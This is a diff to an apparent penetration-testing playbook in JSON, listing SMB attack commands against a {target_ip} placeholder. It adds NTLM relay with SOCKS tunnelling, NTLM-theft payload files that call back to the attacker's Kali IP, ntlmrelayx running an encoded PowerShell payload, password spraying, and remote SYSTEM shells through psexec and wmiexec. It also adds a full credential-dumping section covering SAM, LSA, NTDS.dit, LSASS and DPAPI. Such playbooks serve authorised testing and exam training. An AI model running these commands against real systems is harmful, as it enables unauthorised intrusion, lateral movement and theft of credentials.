@@ -25,6 +25,14 @@
           ]
         },
         {
+          "id": "smb_signing_check",
+          "title": "Check SMB Signing (Relay Targets)",
+          "description": "Scan the target to see if SMB signing is disabled. If so, it is vulnerable to NTLM relay attacks.",
+          "commands": [
+            "nxc smb {target_ip} --gen-relay-list smb_unsigned_ips.txt"
+          ]
+        },
+        {
           "id": "smb_enum4linux",
           "title": "Enum4Linux Recon",
           "description": "Run Enum4Linux for comprehensive share, user, and domain enumeration.",
@@ -43,45 +51,33 @@
           "description": "Connect to a specific accessible share. Use 'get' to download files and 'put' to test upload permissions.",
           "commands": [
             "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<Domain>\\\\<user>' --password '<password>'",
-            "smbclient -L \\\\\\\\{target_ip}\\\\ -U <user>",
             "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U <user> --pw-nt-hash <NTLM_HASH>"
           ]
         },
         {
-          "id": "smb_download_all",
-          "title": "Recursive Share Download",
-          "description": "Quickly pull an entire SMB share to your local machine for offline analysis.",
+          "id": "smb_spider_plus",
+          "title": "Deep Share Crawling (Spider_Plus)",
+          "description": "Use NetExec's spider_plus module to recursively map out all readable files on the target's SMB shares.",
           "commands": [
-            "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<user>' -c 'prompt OFF; recurse ON; mget *'",
-            "smbget -R smb://{target_ip}/<ShareName> -U '<user>'"
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -M spider_plus",
+            "manspider {target_ip} -c passw -e txt,xml,docx,ini -d <domain> -u <user> -p <password>"
           ]
         },
         {
-          "id": "smb_mount_cifs",
-          "title": "Mount Share Locally (CIFS)",
-          "description": "Mount the remote share to your Kali filesystem to bypass smbclient limitations and use native Linux tools like grep.",
+          "id": "smb_user_enum",
+          "title": "Enumerate Users & Sessions",
+          "description": "Pull a list of all domain users or find out exactly who is currently logged into this machine.",
           "commands": [
-            "sudo mkdir -p /mnt/smb",
-            "sudo mount -t cifs -o 'username=guest,password=' //{target_ip}/<ShareName> /mnt/smb",
-            "sudo mount -t cifs -o 'username=<user>,password=<password>,domain=<domain>' //{target_ip}/<ShareName> /mnt/smb",
-            "sudo umount /mnt/smb"
-          ]
-        },
-        {
-          "id": "smb_smbmap",
-          "title": "SMBMap Permissions Check",
-          "description": "Map out all share drives and check read/write permissions for a specific user.",
-          "commands": [
-            "smbmap -u '<user>' -p '<password>' -d <domain> -H {target_ip}"
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --users",
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --loggedon-users"
           ]
         },
         {
           "id": "smb_password_spray",
-          "title": "Password Spraying (CME / NetExec)",
-          "description": "Use CrackMapExec or NetExec to spray user lists and custom wordlists against SMB.",
+          "title": "Password Spraying (NetExec)",
+          "description": "Use NetExec to spray user lists and custom wordlists against SMB.",
           "commands": [
-            "crackmapexec smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success --shares",
-            "netexec smb {target_ip} -u <user> -p '<password>' --verbose --shares"
+            "nxc smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success --shares"
           ]
         }
       ]
@@ -106,7 +102,6 @@
             "enumdomusers",
             "enumdomgroups",
             "queryuser <username_rid>",
-            "querygroup <group_rid>",
             "setuserinfo2 <user> 23 'Password123!'"
           ]
         },
@@ -127,17 +122,19 @@
         {
           "id": "smb_ntlm_theft",
           "title": "Generate NTLM Theft Payload",
-          "description": "Generate malicious files (like .lnk) to upload to a writable share to force authentication back to you.",
+          "description": "Generate malicious files (like .lnk or .scf) to upload to a writable share to force authentication back to you.",
           "commands": [
-            "python3 ntlm_theft.py --generate all --server <Kali_IP> --f test"
+            "python3 ntlm_theft.py --generate all --server <Kali_IP> --f test",
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -M slinky -o NAME=test SERVER=<Kali_IP>"
           ]
         },
         {
           "id": "smb_ntlm_relay",
           "title": "Responder & NTLMRelayX",
-          "description": "Catch hashes with Responder, or relay them directly to execute a base64 powershell payload.",
+          "description": "Catch hashes with Responder, or relay them directly. If SMB signing is disabled, relay with SOCKS to tunnel tools like proxychains.",
           "commands": [
             "sudo responder -I tun0",
+            "impacket-ntlmrelayx -tf smb_unsigned_ips.txt -smb2support -socks",
             "impacket-ntlmrelayx --no-http-server -smb2support -t {target_ip} -c \"powershell -enc <base64_payload>\""
           ]
         },
@@ -147,8 +144,7 @@
           "description": "Host an SMB server on Kali to transfer files to/from the target.",
           "commands": [
             "impacket-smbserver test . -smb2support -username kali -password kali",
-            "net use m: \\\\\\\\<Kali_IP>\\\\test /user:kali kali",
-            "copy mimikatz.log m:\\\\"
+            "net use m: \\\\\\\\<Kali_IP>\\\\test /user:kali kali"
           ]
         }
       ]
@@ -157,36 +153,73 @@
       "category": "5. Command Execution & Shells",
       "tasks": [
         {
+          "id": "smb_nxc_exec",
+          "title": "NetExec Pseudo-Shell",
+          "description": "Quickly execute a single command across the target via SMB without dropping an interactive shell.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -x 'whoami'"
+          ]
+        },
+        {
           "id": "smb_psexec",
           "title": "Impacket PsExec",
-          "description": "Gain an interactive SYSTEM shell using administrative credentials or NTLM hashes. Interactive shell will always be SYSTEM.",
+          "description": "Gain an interactive SYSTEM shell using administrative credentials or NTLM hashes.",
           "commands": [
-            "impacket-psexec <user>@{target_ip} -no-pass",
             "impacket-psexec <domain>/<user>:'<password>'@{target_ip}",
             "impacket-psexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}"
           ]
         },
         {
           "id": "smb_wmiexec",
-          "title": "Impacket WMIExec",
-          "description": "Execute commands stealthily via WMI (bypasses some AV compared to PsExec).",
+          "title": "Impacket WMIExec / SMBExec",
+          "description": "Execute commands stealthily via WMI or SMBExec (bypasses some AV compared to PsExec).",
           "commands": [
             "impacket-wmiexec \"<user>\":<password>@{target_ip}",
-            "impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}"
-          ]
-        },
-        {
-          "id": "smb_smbexec",
-          "title": "Impacket SMBExec",
-          "description": "A similar approach to PsExec but doesn't drop a binary on the target. Good for getting a quick bind shell payload across.",
-          "commands": [
             "impacket-smbexec <user>:'<password>'@{target_ip}"
           ]
         }
       ]
     },
     {
-      "category": "6. Known Vulnerabilities",
+      "category": "6. Credential Dumping (Requires Admin)",
+      "tasks": [
+        {
+          "id": "smb_dump_sam_lsa",
+          "title": "Dump SAM & LSA Secrets",
+          "description": "Extract local password hashes and LSA secrets from the registry.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --sam",
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --lsa"
+          ]
+        },
+        {
+          "id": "smb_dump_ntds",
+          "title": "Dump NTDS.dit (Domain Controllers)",
+          "description": "If the target is a Domain Controller and you have DA privileges, dump the entire Active Directory database.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -d <domain> --ntds"
+          ]
+        },
+        {
+          "id": "smb_dump_lsass",
+          "title": "Dump LSASS Memory",
+          "description": "Extract cleartext passwords and Kerberos tickets directly from LSASS memory.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -M lsassy"
+          ]
+        },
+        {
+          "id": "smb_dump_dpapi",
+          "title": "Extract DPAPI Masterkeys",
+          "description": "Hunt for DPAPI masterkeys and browser cookies.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --dpapi"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "7. Known Vulnerabilities",
       "tasks": [
         {
           "id": "smb_ms17_010",
@@ -194,7 +227,7 @@
           "description": "Scan for the MS17-010 vulnerability, which allows unauthenticated remote code execution as SYSTEM.",
           "commands": [
             "nmap --script smb-vuln-ms17-010 -p 445 {target_ip}",
-            "crackmapexec smb {target_ip} -M ms17-010"
+            "nxc smb {target_ip} -M ms17-010"
           ]
         },
         {
@@ -202,7 +235,16 @@
           "title": "ZeroLogon (CVE-2020-1472) Check",
           "description": "Check if a Domain Controller is vulnerable to ZeroLogon.",
           "commands": [
-            "crackmapexec smb {target_ip} -M zerologon"
+            "nxc smb {target_ip} -M zerologon"
+          ]
+        },
+        {
+          "id": "smb_printnightmare",
+          "title": "PrintNightmare / noPac Checks",
+          "description": "Scan for PrintNightmare (CVE-2021-1675) and noPac (CVE-2021-42287) vulnerabilities.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -M printnightmare",
+            "nxc smb {target_ip} -u '<user>' -p '<password>' -M nopac"
           ]
         }
       ]
